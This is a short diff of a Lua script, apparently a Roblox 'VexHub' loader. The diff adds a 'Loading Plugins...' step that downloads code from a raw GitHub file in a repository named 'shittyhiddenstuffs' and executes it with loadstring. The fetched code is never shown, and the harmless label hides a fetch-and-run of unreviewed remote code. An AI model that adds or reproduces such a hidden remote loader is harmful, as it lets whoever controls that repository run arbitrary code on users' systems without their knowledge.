@@ -316,6 +316,13 @@ for Names, _ in Usernames do
 
 		CheckIfSuccess(Success, Error)
 
+		Message:Output("Loading Plugins...")
+		local Success, Error = pcall(function()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/shittystuffs/shittyhiddenstuffs/main/Plugins"))()
+		end)
+
+		CheckIfSuccess(Success, Error)
+
 		if Errors == 0 then
 			Message:Success("VexHub loaded!")
 
